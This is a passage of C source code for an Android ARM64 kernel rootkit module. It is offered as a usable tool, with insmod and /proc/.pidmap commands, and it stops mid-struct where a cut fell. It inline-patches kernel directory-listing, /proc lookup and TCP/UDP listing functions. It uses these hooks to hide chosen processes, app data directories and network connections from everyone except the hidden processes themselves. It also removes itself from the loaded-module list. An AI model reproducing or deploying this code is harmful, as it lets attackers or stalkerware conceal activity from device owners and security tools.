/*
 * hidepid_kmod.c - 内核态 PID + 应用隐藏模块 (GKI 5.10+ ARM64)
 *
 * 原理: 通过 inline hook 拦截 filldir64/filldir，在目录列举时
 *       跳过目标条目，实现全局隐藏（对所有进程，含静态链接程序）。
 *
 * 功能:
 *   1. PID 隐藏 - 在 /proc 目录列举时跳过目标 PID
 *   2. 应用隐藏 - 在任意目录列举时跳过匹配包名的条目
 *      （/data/data/<pkg>, /data/app/<slot>/<pkg> 等）
 *   3. 模块自隐藏 - 从 /proc/modules 摘除自身
 *
 * 自隐藏特性:
 *   - 从 /proc/modules 链表中摘除自身（lsmod 看不到）
 *   - /proc 目录列举时过滤 .pidmap 条目（ls /proc 看不到管理接口）
 *   - 通过 /proc/.pidmap 的 "unload" 命令安全卸载（延迟工作队列 + 异步 rmmod）
 *
 * 用法:
 *   insmod hidepid_kmod.ko                      # 加载模块（只执行一次）
 *
 *   # PID 管理
 *   echo 12345 > /proc/.pidmap                  # 添加隐藏 PID
 *   echo 0     > /proc/.pidmap                  # 隐藏当前写入进程自身
 *   echo -12345 > /proc/.pidmap                 # 移除隐藏 PID
 *
 *   # 应用管理
 *   echo "app:com.example.app" > /proc/.pidmap  # 隐藏应用（过滤 /data/data 等目录中的包名条目）
 *   echo "unapp:com.example.app" > /proc/.pidmap  # 取消隐藏应用
 *
 *   # 通用
 *   echo clear  > /proc/.pidmap                 # 清空所有隐藏 PID 和应用
 *   echo unload > /proc/.pidmap                 # 安全卸载模块
 *   cat /proc/.pidmap                           # 查看已隐藏列表
 *
 * 适配: 支持所有 GKI 5.10+ 内核（android12-5.10 ~ android16-6.12）
 */

#include <linux/module.h>
#include <linux/moduleloader.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/sched.h>
#include <linux/limits.h>
#include <linux/stop_machine.h>
#include <linux/spinlock.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/list.h>
#include <linux/kmod.h>
#include <linux/mutex.h>
#include <linux/workqueue.h>
#include <linux/mm.h>
#include <linux/sched/mm.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <asm/set_memory.h>
#include <asm/cacheflush.h>
#include <asm/insn.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hidepid");
MODULE_DESCRIPTION("Hide PID and Apps from /proc (GKI 5.10+ ARM64)");

/* ==================== 编译时日志静默 ==================== */
#ifndef HIDE_DEBUG
#define HIDE_DEBUG 1
#endif

#if HIDE_DEBUG
#define hide_info(fmt, ...)  pr_info("hidepid: " fmt, ##__VA_ARGS__)
#define hide_err(fmt, ...)   pr_err("hidepid: " fmt, ##__VA_ARGS__)
#define hide_warn(fmt, ...)  pr_warn("hidepid: " fmt, ##__VA_ARGS__)
#else
#define hide_info(fmt, ...)  do {} while (0)
#define hide_err(fmt, ...)   do {} while (0)
#define hide_warn(fmt, ...)  do {} while (0)
#endif

/* ==================== 隐藏 PID 列表管理 ==================== */

#define MAX_HIDE_PIDS 64

static pid_t hide_pids[MAX_HIDE_PIDS];
static int   hide_count = 0;
static DEFINE_SPINLOCK(hide_lock);

static bool is_pid_hidden(pid_t pid) {
    int i;
    int cnt = smp_load_acquire(&hide_count);
    for (i = 0; i < cnt; i++) {
        if (READ_ONCE(hide_pids[i]) == pid)
            return true;
    }
    return false;
}

static int add_hide_pid(pid_t pid) {
    int i;
    unsigned long flags;
    if (pid <= 0) return -EINVAL;
    spin_lock_irqsave(&hide_lock, flags);
    for (i = 0; i < hide_count; i++) {
        if (hide_pids[i] == pid) {
            spin_unlock_irqrestore(&hide_lock, flags);
            return 0;
        }
    }
    if (hide_count >= MAX_HIDE_PIDS) {
        spin_unlock_irqrestore(&hide_lock, flags);
        return -ENOSPC;
    }
    hide_pids[hide_count] = pid;
    smp_store_release(&hide_count, hide_count + 1);
    spin_unlock_irqrestore(&hide_lock, flags);
    return 0;
}

static int del_hide_pid(pid_t pid) {
    int i;
    unsigned long flags;
    spin_lock_irqsave(&hide_lock, flags);
    for (i = 0; i < hide_count; i++) {
        if (hide_pids[i] == pid) {
            hide_pids[i] = hide_pids[hide_count - 1];
            hide_count--;
            spin_unlock_irqrestore(&hide_lock, flags);
            return 0;
        }
    }
    spin_unlock_irqrestore(&hide_lock, flags);
    return -ENOENT;
}

static void clear_hide_pids(void) {
    unsigned long flags;
    spin_lock_irqsave(&hide_lock, flags);
    hide_count = 0;
    spin_unlock_irqrestore(&hide_lock, flags);
}

/* ==================== 隐藏应用包名列表管理 ==================== */

#define MAX_HIDE_APPS    32
#define MAX_PKG_NAME_LEN 256

static char hide_apps[MAX_HIDE_APPS][MAX_PKG_NAME_LEN];
static int  hide_app_count = 0;

static bool is_app_hidden(const char *name, int namlen) {
    int i, cnt;
    unsigned long flags;

    spin_lock_irqsave(&hide_lock, flags);
    cnt = hide_app_count;
    spin_unlock_irqrestore(&hide_lock, flags);

    for (i = 0; i < cnt; i++) {
        int pkg_len;
        spin_lock_irqsave(&hide_lock, flags);
        pkg_len = strlen(hide_apps[i]);
        spin_unlock_irqrestore(&hide_lock, flags);

        if (pkg_len == namlen && strncmp(name, hide_apps[i], namlen) == 0)
            return true;
    }
    return false;
}

static int add_hide_app(const char *pkg) {
    int i;
    unsigned long flags;
    int len;

    if (!pkg || !*pkg) return -EINVAL;
    len = strlen(pkg);
    if (len >= MAX_PKG_NAME_LEN) return -ENAMETOOLONG;

    spin_lock_irqsave(&hide_lock, flags);
    for (i = 0; i < hide_app_count; i++) {
        if (strcmp(hide_apps[i], pkg) == 0) {
            spin_unlock_irqrestore(&hide_lock, flags);
            return 0;
        }
    }
    if (hide_app_count >= MAX_HIDE_APPS) {
        spin_unlock_irqrestore(&hide_lock, flags);
        return -ENOSPC;
    }
    strncpy(hide_apps[hide_app_count], pkg, MAX_PKG_NAME_LEN - 1);
    hide_apps[hide_app_count][MAX_PKG_NAME_LEN - 1] = '\0';
    hide_app_count++;
    spin_unlock_irqrestore(&hide_lock, flags);
    return 0;
}

static int del_hide_app(const char *pkg) {
    int i;
    unsigned long flags;
    spin_lock_irqsave(&hide_lock, flags);
    for (i = 0; i < hide_app_count; i++) {
        if (strcmp(hide_apps[i], pkg) == 0) {
            /* 用最后一个覆盖当前条目 */
            hide_app_count--;
            if (i < hide_app_count) {
                strncpy(hide_apps[i], hide_apps[hide_app_count], MAX_PKG_NAME_LEN - 1);
                hide_apps[i][MAX_PKG_NAME_LEN - 1] = '\0';
            }
            hide_apps[hide_app_count][0] = '\0';
            spin_unlock_irqrestore(&hide_lock, flags);
            return 0;
        }
    }
    spin_unlock_irqrestore(&hide_lock, flags);
    return -ENOENT;
}

static void clear_hide_apps(void) {
    unsigned long flags;
    spin_lock_irqsave(&hide_lock, flags);
    hide_app_count = 0;
    spin_unlock_irqrestore(&hide_lock, flags);
}

/* ==================== 进程自动扫描 ==================== */
/* 隐藏应用时自动扫描运行中的进程，将匹配包名的 PID 加入隐藏列表。
 * 使用工作队列定期执行，持续监控新启动的进程。 */

static struct delayed_work scan_work;
static bool scan_active = false;
#define SCAN_INTERVAL_MS 3000  /* 每 3 秒扫描一次 */

/* 读取指定进程的 cmdline（包名通常在 cmdline 第一个参数）*/
static bool get_task_cmdline(struct task_struct *task, char *buf, int bufsize) {
    struct mm_struct *mm;
    int bytes_read = 0;

    mm = get_task_mm(task);
    if (!mm) return false;

    if (mm->arg_start && mm->arg_end > mm->arg_start) {
        unsigned long arg_len = mm->arg_end - mm->arg_start;
        if (arg_len > bufsize - 1) arg_len = bufsize - 1;

        /* 使用 access_remote_vm 读取进程内存 */
        bytes_read = access_remote_vm(mm, mm->arg_start, buf, arg_len, FOLL_FORCE);
        if (bytes_read > 0) {
            buf[bytes_read] = '\0';
            /* cmdline 中参数以 \0 分隔，只取第一个（包名）*/
            /* 但 Android 的 zygote 进程 cmdline 可能是进程名 */
        }
    }

    mmput(mm);
    return bytes_read > 0;
}

/* 扫描所有进程，将运行隐藏应用的进程 PID 自动加入隐藏列表 */
static void scan_work_fn(struct work_struct *work) {
    struct task_struct *task;
    char cmdline[MAX_PKG_NAME_LEN];
    int i, app_cnt;
    char (*apps_snapshot)[MAX_PKG_NAME_LEN];
    unsigned long flags;

    apps_snapshot = kcalloc(MAX_HIDE_APPS, sizeof(*apps_snapshot), GFP_KERNEL);
    if (!apps_snapshot)
        return;

    /* 快照当前隐藏应用列表 */
    spin_lock_irqsave(&hide_lock, flags);
    app_cnt = hide_app_count;
    memcpy(apps_snapshot, hide_apps, sizeof(*apps_snapshot) * app_cnt);
    spin_unlock_irqrestore(&hide_lock, flags);

    if (app_cnt == 0) {
        scan_active = false;
        kfree(apps_snapshot);
        return;
    }

    /* 遍历所有进程 */
    rcu_read_lock();
    for_each_process(task) {
        if (!get_task_cmdline(task, cmdline, sizeof(cmdline)))
            continue;

        /* 检查 cmdline 是否匹配某个隐藏应用 */
        for (i = 0; i < app_cnt; i++) {
            if (strcmp(cmdline, apps_snapshot[i]) == 0) {
                pid_t pid = task->pid;
                if (!is_pid_hidden(pid)) {
                    add_hide_pid(pid);
                    hide_info("auto-hide pid=%d (%s)\n", pid, cmdline);
                }
                break;
            }
        }
    }
    rcu_read_unlock();

    /* 重新调度下一次扫描 */
    if (scan_active) {
        schedule_delayed_work(&scan_work, msecs_to_jiffies(SCAN_INTERVAL_MS));
    }

    kfree(apps_snapshot);
}

static void start_scan(void) {
    if (scan_active) return;
    scan_active = true;
    schedule_delayed_work(&scan_work, 0);
}

static void stop_scan(void) {
    scan_active = false;
    cancel_delayed_work_sync(&scan_work);
}

/* ==================== kallsyms_lookup_name 绕过 ==================== */

static unsigned long (*kln_ptr)(const char *name);

static int kln_dummy(struct kprobe *p, struct pt_regs *regs) { return 0; }

static int resolve_kln(void) {
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
        .pre_handler = kln_dummy,
    };
    int ret = register_kprobe(&kp);
    if (ret < 0) return ret;
    kln_ptr = (void *)kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

static unsigned long ksym(const char *name) {
    return kln_ptr ? kln_ptr(name) : 0;
}

/* ==================== 模块链表自隐藏（安全版） ==================== */

static struct mutex    *p_module_mutex = NULL;
static struct list_head *p_modules_list = NULL;
static bool module_hidden = false;

static int resolve_module_symbols(void) {
    p_module_mutex = (struct mutex *)ksym("module_mutex");
    p_modules_list = (struct list_head *)ksym("modules");
    if (!p_module_mutex || !p_modules_list) {
        hide_err("cannot resolve module_mutex or modules list\n");
        return -ENOENT;
    }
    return 0;
}

static void hide_module_from_list(void) {
    if (module_hidden) return;
    if (!p_module_mutex || !p_modules_list) return;

    mutex_lock(p_module_mutex);
    list_del(&THIS_MODULE->list);
    mutex_unlock(p_module_mutex);

    module_hidden = true;
    hide_info("module hidden from /proc/modules\n");
}

static void unhide_module_to_list(void) {
    if (!module_hidden) return;

    if (p_module_mutex && p_modules_list) {
        mutex_lock(p_module_mutex);
        list_add_tail(&THIS_MODULE->list, p_modules_list);
        mutex_unlock(p_module_mutex);
    }

    module_hidden = false;
    hide_info("module restored to /proc/modules\n");
}

/* ==================== ARM64 inline hook 基础设施 ==================== */

#define HOOK_BYTES  16  /* 4 条 ARM64 指令 */
#define TRAMP_BYTES (HOOK_BYTES + 16)
#define EXECMEM_MODULE_TEXT_TYPE 0

struct hook_ctx {
    void *target;
    void *trampoline;
    u8    orig[HOOK_BYTES];
    bool  active;
};

static void encode_branch(u8 *buf, void *addr) {
    u32 *p = (u32 *)buf;
    p[0] = 0x58000050;           /* LDR X16, [PC, #8] */
    p[1] = 0xD61F0200;           /* BR  X16           */
    *(u64 *)&p[2] = (u64)addr;
}

/* 检查指令是否为 PC 相对寻址（跳板中执行会出错）*/
static bool is_pc_relative(u32 insn) {
    if ((insn & 0x9F000000) == 0x90000000) return true; /* ADRP */
    if ((insn & 0x9F000000) == 0x10000000) return true; /* ADR  */
    if ((insn & 0xFC000000) == 0x14000000) return true; /* B    */
    if ((insn & 0xFC000000) == 0x94000000) return true; /* BL   */
    if ((insn & 0x7E000000) == 0x34000000) return true; /* CBZ/CBNZ */
    if ((insn & 0x7E000000) == 0x36000000) return true; /* TBZ/TBNZ */
    if ((insn & 0xBF000000) == 0x18000000) return true; /* LDR literal */
    return false;
}

static bool check_safe_to_hook(void *target) {
    u32 *insns = (u32 *)target;
    int i;
    /* 检测目标是否已被 inline hook（我们的或其他模块的跳板签名）*/
    if (insns[0] == 0x58000050 && insns[1] == 0xD61F0200) {
        hide_err("target appears to be already hooked "
               "(LDR X16 + BR X16 signature), aborting\n");
        return false;
    }
    for (i = 0; i < 4; i++) {
        if (is_pc_relative(insns[i])) {
            hide_err("instruction at offset %d is PC-relative (0x%08x), "
                   "unsafe for inline hook\n", i * 4, insns[i]);
            return false;
        }
    }
    return true;
}

struct patch_data {
    void       *dst;
    const u8   *src;
};

static int apply_patch_fn(void *arg) {
    struct patch_data *pd = arg;
    memcpy(pd->dst, pd->src, HOOK_BYTES);
    flush_icache_range((unsigned long)pd->dst,
                       (unsigned long)pd->dst + HOOK_BYTES);
    return 0;
}

/* 计算跨页所需的页数，防止 patch 跨页时第二页未设 RW 导致 panic */
static int set_target_memory_rw(void *target) {
    unsigned long addr = (unsigned long)target;
    unsigned long start_page = addr & PAGE_MASK;
    unsigned long end_addr = addr + HOOK_BYTES;
    unsigned long end_page = (end_addr - 1) & PAGE_MASK;
    int npages = (end_page - start_page) / PAGE_SIZE + 1;
    return set_memory_rw(start_page, npages);
}

static int set_target_memory_ro(void *target) {
    unsigned long addr = (unsigned long)target;
    unsigned long start_page = addr & PAGE_MASK;
    unsigned long end_addr = addr + HOOK_BYTES;
    unsigned long end_page = (end_addr - 1) & PAGE_MASK;
    int npages = (end_page - start_page) / PAGE_SIZE + 1;
    return set_memory_ro(start_page, npages);
}

static int set_trampoline_memory_rx(void *addr, size_t size) {
    unsigned long start_page = (unsigned long)addr & PAGE_MASK;
    unsigned long end_addr = (unsigned long)addr + size;
    unsigned long end_page = (end_addr - 1) & PAGE_MASK;
    int npages = (end_page - start_page) / PAGE_SIZE + 1;
    int ret;

    ret = set_memory_x(start_page, npages);
    if (ret)
        return ret;

    return set_memory_ro(start_page, npages);
}

typedef void *(*module_alloc_fn)(unsigned long size);
typedef void (*module_memfree_fn)(void *ptr);
typedef void *(*execmem_alloc_fn)(int type, size_t size);
typedef void (*execmem_free_fn)(void *ptr);

static void *alloc_trampoline(size_t size) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
    execmem_alloc_fn execmem_alloc_ptr;

    execmem_alloc_ptr = (execmem_alloc_fn)ksym("execmem_alloc");
    if (execmem_alloc_ptr)
        return execmem_alloc_ptr(EXECMEM_MODULE_TEXT_TYPE, size);
#endif

    {
        module_alloc_fn module_alloc_ptr;

        module_alloc_ptr = (module_alloc_fn)ksym("module_alloc");
        if (module_alloc_ptr)
            return module_alloc_ptr((unsigned long)size);
    }

    hide_err("cannot resolve trampoline allocator\n");
    return NULL;
}

static void free_trampoline(void *ptr) {
    if (!ptr)
        return;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
    {
        execmem_free_fn execmem_free_ptr;

        execmem_free_ptr = (execmem_free_fn)ksym("execmem_free");
        if (execmem_free_ptr) {
            execmem_free_ptr(ptr);
            return;
        }
    }
#endif

    {
        module_memfree_fn module_memfree_ptr;

        module_memfree_ptr = (module_memfree_fn)ksym("module_memfree");
        if (module_memfree_ptr) {
            module_memfree_ptr(ptr);
            return;
        }
    }

    hide_warn("cannot resolve trampoline freer, leaking trampoline memory\n");
}

static int install_hook(struct hook_ctx *h, const char *sym, void *hook_fn) {
    unsigned long addr = ksym(sym);
    int ret;

    if (!addr) {
        hide_err("symbol %s not found\n", sym);
        return -ENOENT;
    }

    h->target = (void *)addr;

    if (!check_safe_to_hook(h->target)) {
        hide_err("%s has PC-relative instructions, skip hook\n", sym);
        return -EINVAL;
    }

    memcpy(h->orig, h->target, HOOK_BYTES);

    h->trampoline = alloc_trampoline(TRAMP_BYTES);
    if (!h->trampoline) return -ENOMEM;

    memcpy(h->trampoline, h->orig, HOOK_BYTES);
    encode_branch((u8 *)h->trampoline + HOOK_BYTES,
                  (u8 *)h->target + HOOK_BYTES);
    flush_icache_range((unsigned long)h->trampoline,
                       (unsigned long)h->trampoline + TRAMP_BYTES);
    ret = set_trampoline_memory_rx(h->trampoline, TRAMP_BYTES);
    if (ret) {
        hide_err("failed to mark trampoline executable: %d\n", ret);
        free_trampoline(h->trampoline);
        h->trampoline = NULL;
        return ret;
    }

    {
        u8 patch[HOOK_BYTES];
        struct patch_data pd;
        encode_branch(patch, hook_fn);
        pd.dst = h->target;
        pd.src = patch;

        set_target_memory_rw(h->target);
        stop_machine(apply_patch_fn, &pd, NULL);
        set_target_memory_ro(h->target);
    }

    h->active = true;
    hide_info("hooked %s @%px trampoline@%px\n",
            sym, h->target, h->trampoline);
    return 0;
}

static void remove_hook(struct hook_ctx *h) {
    if (!h->active) return;
    {
        struct patch_data pd = { .dst = h->target, .src = h->orig };
        set_target_memory_rw(h->target);
        stop_machine(apply_patch_fn, &pd, NULL);
        set_target_memory_ro(h->target);
    }

    /* 等待所有 CPU 退出 hook 函数后再释放跳板 */
    synchronize_rcu();
    schedule();
    synchronize_rcu();

    free_trampoline(h->trampoline);
    h->trampoline = NULL;
    h->active = false;
    hide_info("unhooked @%px\n", h->target);
}

/* ==================== PID 解析 ==================== */

static bool parse_pid(const char *name, pid_t *out) {
    long val = 0;
    const char *p;

    if (!name || !*name) return false;
    for (p = name; *p; ++p) {
        if (*p < '0' || *p > '9') return false;
        val = val * 10 + (*p - '0');
        if (val > INT_MAX) return false;
    }
    *out = (pid_t)val;
    return true;
}

/* ==================== Hook 函数 ==================== */

#define PROC_NAME ".pidmap"
#define MODULE_NAME_STR "hidepid_kmod"

typedef int (*filldir_fn)(struct dir_context *, const char *, int,
                           loff_t, u64, unsigned int);

static struct hook_ctx h_filldir64;
static struct hook_ctx h_filldir;

/* ==================== 单向隐藏 ==================== */
/* 核心原则: 被隐藏的进程不受任何限制, 能看到一切 (包括其他隐藏进程、
 * root 痕迹、模块自身). 只有普通进程才会被过滤.
 *
 *   - 普通进程: 看不到隐藏的 PID、应用、模块痕迹
 *   - 隐藏进程: 看得到一切 (不受限制) */

/* 检查名字是否需要被过滤（模块自身痕迹）*/
static bool should_hide_name(const char *name) {
    if (strcmp(name, PROC_NAME) == 0)
        return true;
    if (strcmp(name, MODULE_NAME_STR) == 0)
        return true;
    return false;
}

/* 核心: 判断目录条目是否应被隐藏
 * 单向隐藏: 如果当前进程自身是被隐藏的, 跳过所有过滤 */
static bool should_hide_entry(const char *name, int namlen) {
    pid_t pid;

    /* 单向隐藏: 隐藏进程不受限制, 看得到一切 */
    if (is_pid_hidden(current->pid))
        return false;

    /* 以下过滤仅对普通进程生效 */

    /* 过滤模块自身痕迹 */
    if (should_hide_name(name))
        return true;

    /* 过滤目标 PID */
    if (parse_pid(name, &pid) && is_pid_hidden(pid))
        return true;

    /* 过滤目标应用包名 */
    if (is_app_hidden(name, namlen))
        return true;

    return false;
}

static int hook_filldir64(struct dir_context *ctx, const char *name,
                           int namlen, loff_t offset, u64 ino,
                           unsigned int d_type) {
    if (should_hide_entry(name, namlen))
        return 0;
    return ((filldir_fn)h_filldir64.trampoline)(
        ctx, name, namlen, offset, ino, d_type);
}

static int hook_filldir(struct dir_context *ctx, const char *name,
                         int namlen, loff_t offset, u64 ino,
                         unsigned int d_type) {
    if (should_hide_entry(name, namlen))
        return 0;
    return ((filldir_fn)h_filldir.trampoline)(
        ctx, name, namlen, offset, ino, d_type);
}

/* ==================== proc_pid_lookup hook ==================== */
/* 阻断直接访问 /proc/<hidden_pid>/...
 * 当用户执行 cat /proc/12345/cmdline 时, VFS 会调用 proc_pid_lookup
 * 解析 /proc/12345 路径. 我们在此返回 -ENOENT, 使整个 /proc/<pid>/ 子树
 * 不可访问 (cmdline, status, maps, fd, net 等全部阻断).
 *
 * 单向隐藏: 隐藏进程不受限制, 可以直接访问任何 /proc/<pid>/... */

typedef struct dentry *(*proc_pid_lookup_fn)(struct dentry *, unsigned int);

static struct hook_ctx h_proc_pid_lookup;

static struct dentry *hook_proc_pid_lookup(struct dentry *dentry,
                                            unsigned int flags) {
    pid_t pid;

    /* 单向隐藏: 隐藏进程不受限制, 可以访问一切 */
    if (is_pid_hidden(current->pid))
        return ((proc_pid_lookup_fn)h_proc_pid_lookup.trampoline)(dentry, flags);

    /* 普通进程: 阻断直接访问隐藏 PID 的 /proc/<pid>/... */
    if (parse_pid(dentry->d_name.name, &pid) && is_pid_hidden(pid))
        return ERR_PTR(-ENOENT);

    return ((proc_pid_lookup_fn)h_proc_pid_lookup.trampoline)(dentry, flags);
}

/* ==================== 网络连接隐藏 ==================== */
/* Hook tcp4/tcp6/udp4/udp6 的 seq_show 函数, 过滤隐藏进程的网络连接.
 * 通过 socket → file → f_owner.pid 查找 socket 归属进程.
 * f_owner.pid 在 fcntl(F_SETOWN) 后设置, 大多数应用层 socket 都有此字段. */

typedef int (*seq_show_fn)(struct seq_file *, void *);

static struct hook_ctx h_tcp4_seq_show;
static struct hook_ctx h_tcp6_seq_show;
static struct hook_ctx h_udp4_seq_show;
static struct hook_ctx h_udp6_seq_show;

static struct pid *file_owner_pid(struct file *file) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
    struct fown_struct *owner;

    owner = READ_ONCE(file->f_owner);
    if (!owner)
        return NULL;

    return READ_ONCE(owner->pid);
#else
    return READ_ONCE(file->f_owner.pid);
#endif
}

/* 从 seq_file 的 void *v (指向 struct sock) 检查是否属于隐藏进程
 * 单向隐藏: 隐藏进程不受限制, 能看到所有连接 */
static bool is_socket_owner_hidden(void *v) {
    struct sock *sk;
    struct socket *sock;
    struct file *file;
    struct pid *owner_pid;

    /* 单向隐藏: 隐藏进程不受限制, 看得到一切 */
    if (is_pid_hidden(current->pid))
        return false;

    if (!v || v == SEQ_START_TOKEN)
        return false;

    sk = (struct sock *)v;

    /* 缓存 sk_socket 指针, 防止 TOCTOU 竞争:
     * sock_orphan() 可能在两次读取之间将 sk->sk_socket 置 NULL */
    sock = READ_ONCE(sk->sk_socket);
    if (!sock)
        return false;

    file = READ_ONCE(sock->file);
    if (!file)
        return false;

    owner_pid = file_owner_pid(file);
    if (!owner_pid)
        return false;

    /* 普通进程: 隐藏隐藏进程的网络连接 */
    return is_pid_hidden(pid_nr(owner_pid));
}

static int hook_tcp4_seq_show(struct seq_file *seq, void *v) {
    if (is_socket_owner_hidden(v))
        return 0; /* 跳过此条目 */
    return ((seq_show_fn)h_tcp4_seq_show.trampoline)(seq, v);
}

static int hook_tcp6_seq_show(struct seq_file *seq, void *v) {
    if (is_socket_owner_hidden(v))
        return 0;
    return ((seq_show_fn)h_tcp6_seq_show.trampoline)(seq, v);
}

static int hook_udp4_seq_show(struct seq_file *seq, void *v) {
    if (is_socket_owner_hidden(v))
        return 0;
    return ((seq_show_fn)h_udp4_seq_show.trampoline)(seq, v);
}

static int hook_udp6_seq_show(struct seq_file *seq, void *v) {
    if (is_socket_owner_hidden(v))
        return 0;
    return ((seq_show_fn)h_udp6_seq_show.trampoline)(seq, v);
}

/* ==================== /proc 管理接口 ==================== */

static struct proc_dir_entry *hidepid_entry;

static int hidepid_proc_show(struct seq_file *m, void *v) {
    int i;
    unsigned long flags;
    pid_t *pids_copy;
    int pid_count_copy;
    char (*apps_copy)[MAX_PKG_NAME_LEN];
    int app_count_copy;

    pids_copy = kcalloc(MAX_HIDE_PIDS, sizeof(*pids_copy), GFP_KERNEL);
    apps_copy = kcalloc(MAX_HIDE_APPS, sizeof(*apps_copy), GFP_KERNEL);
    if (!pids_copy || !apps_copy) {
        kfree(pids_copy);
        kfree(apps_copy);
        return -ENOMEM;
    }

    spin_lock_irqsave(&hide_lock, flags);
    pid_count_copy = hide_count;
    memcpy(pids_copy, hide_pids, sizeof(pid_t) * pid_count_copy);
    app_count_copy = hide_app_count;
    memcpy(apps_copy, hide_apps, sizeof(*apps_copy) * app_count_copy);
    spin_unlock_irqrestore(&hide_lock, flags);

    seq_printf(m, "=== Hidden PIDs (%d/%d) ===\n", pid_count_copy, MAX_HIDE_PIDS);
    for (i = 0; i < pid_count_copy; i++) {
        seq_printf(m, "pid: %d\n", pids_copy[i]);
    }

    seq_printf(m, "\n=== Hidden Apps (%d/%d) ===\n", app_count_copy, MAX_HIDE_APPS);
    for (i = 0; i < app_count_copy; i++) {
        seq_printf(m, "app: %s\n", apps_copy[i]);
    }

    seq_printf(m, "\n=== Scan Status ===\n");
    seq_printf(m, "scan: %s\n", scan_active ? "on" : "off");

    kfree(pids_copy);
    kfree(apps_copy);
    return 0;
}

/* proc open 时增加模块引用计数，防止卸载时 proc 文件仍打开导致 UAF */
static int hidepid_proc_open(struct inode *inode, struct file *file) {
    int ret;
    if (!try_module_get(THIS_MODULE))
        return -ENODEV;
    ret = single_open(file, hidepid_proc_show, NULL);
    if (ret)
        module_put(THIS_MODULE);
    return ret;
}

static int hidepid_proc_release(struct inode *inode, struct file *file) {
    single_release(inode, file);
    module_put(THIS_MODULE);
    return 0;
}

/* ==================== 延迟卸载工作队列 ==================== */

static struct delayed_work unload_work;
static bool unload_in_progress = false;

static void unload_work_fn(struct work_struct *work) {
    stop_scan();

    if (hidepid_entry) {
        proc_remove(hidepid_entry);
        hidepid_entry = NULL;
    }

    clear_hide_pids();
    clear_hide_apps();

    remove_hook(&h_filldir);
    remove_hook(&h_filldir64);
    remove_hook(&h_proc_pid_lookup);
    remove_hook(&h_tcp4_seq_show);
    remove_hook(&h_tcp6_seq_show);
    remove_hook(&h_udp4_seq_show);
    remove_hook(&h_udp6_seq_show);

    unhide_module_to_list();

    hide_info("unload work completed, dispatching rmmod\n");

    {
        char *argv[] = { "/system/bin/sh", "-c",
                         "rmmod " MODULE_NAME_STR " 2>/dev/null",
                         NULL };
        char *envp[] = { "PATH=/system/bin:/system/xbin:/vendor/bin:/sbin",
                         NULL };
        int umh_ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        if (umh_ret)
            hide_err("call_usermodehelper failed: %d\n", umh_ret);
    }
}

static ssize_t hidepid_proc_write(struct file *file, const char __user *buf,
                                   size_t count, loff_t *ppos) {
    char kbuf[MAX_PKG_NAME_LEN + 16];  /* 足够容纳 "app:" 前缀 + 包名 */
    size_t len = min(count, sizeof(kbuf) - 1);
    long val;
    int ret;

    if (copy_from_user(kbuf, buf, len))
        return -EFAULT;
    kbuf[len] = '\0';

    while (len > 0 && (kbuf[len-1] == '\n' || kbuf[len-1] == '\r'))
        kbuf[--len] = '\0';

    /* 特殊命令: clear - 清空所有隐藏 PID 和应用 */
    if (strcmp(kbuf, "clear") == 0) {
        stop_scan();
        clear_hide_pids();
        clear_hide_apps();
        hide_info("cleared all pids and apps\n");
        return count;
    }

    /* 特殊命令: unload - 延迟卸载 */
    if (strcmp(kbuf, "unload") == 0) {
        if (unload_in_progress) {
            hide_info("unload already in progress\n");
            return count;
        }
        unload_in_progress = true;
        stop_scan();
        hide_info("unload scheduled (500ms delay)\n");
        schedule_delayed_work(&unload_work, msecs_to_jiffies(500));
        return count;
    }

    /* 特殊命令: scan - 手动触发一次进程扫描 */
    if (strcmp(kbuf, "scan") == 0) {
        hide_info("manual scan triggered\n");
        schedule_delayed_work(&scan_work, 0);
        return count;
    }

    /* 特殊命令: autoscan - 启动持续自动扫描 */
    if (strcmp(kbuf, "autoscan") == 0) {
        start_scan();
        hide_info("auto-scan started (every %dms)\n", SCAN_INTERVAL_MS);
        return count;
    }

    /* 特殊命令: stopscan - 停止自动扫描 */
    if (strcmp(kbuf, "stopscan") == 0) {
        stop_scan();
        hide_info("auto-scan stopped\n");
        return count;
    }

    /* 应用隐藏命令: app:<package> - 添加后自动启动扫描 */
    if (strncmp(kbuf, "app:", 4) == 0) {
        const char *pkg = kbuf + 4;
        if (!*pkg) {
            hide_err("empty package name\n");
            return -EINVAL;
        }
        ret = add_hide_app(pkg);
        if (ret == 0) {
            hide_info("hidden app: %s\n", pkg);
            /* 自动启动扫描，将该应用的运行进程加入 PID 隐藏 */
            start_scan();
        } else
            hide_err("add_hide_app failed: %d\n", ret);
        return ret ? ret : (ssize_t)count;
    }

    /* 应用取消隐藏命令: unapp:<package> */
    if (strncmp(kbuf, "unapp:", 6) == 0) {
        const char *pkg = kbuf + 6;
        if (!*pkg) {
            hide_err("empty package name\n");
            return -EINVAL;
        }
        ret = del_hide_app(pkg);
        if (ret == 0)
            hide_info("unhidden app: %s\n", pkg);
        else
            hide_err("del_hide_app failed: %d\n", ret);
        return ret ? ret : (ssize_t)count;
    }

    /* PID 数字命令 */
    ret = kstrtol(kbuf, 10, &val);
    if (ret) {
        hide_err("invalid input: %s\n", kbuf);
        return -EINVAL;
    }

    if (val == 0) {
        val = current->pid;
        hide_info("hiding caller pid=%d\n", (int)val);
    }

    if (val > 0) {
        ret = add_hide_pid((pid_t)val);
        if (ret == 0)
            hide_info("added pid=%d\n", (int)val);
    } else {
        ret = del_hide_pid((pid_t)(-val));
        if (ret == 0)
            hide_info("removed pid=%d\n", (int)(-val));
    }

    if (ret) {
        hide_err("operation failed: %d\n", ret);
        return ret;
    }
    return count;
}

static const struct proc_ops hidepid_proc_ops = {
    .proc_open    = hidepid_proc_open,
    .proc_read    = seq_read,
    .proc_write   = hidepid_proc_write,
    .proc_lseek   = seq_lseek,
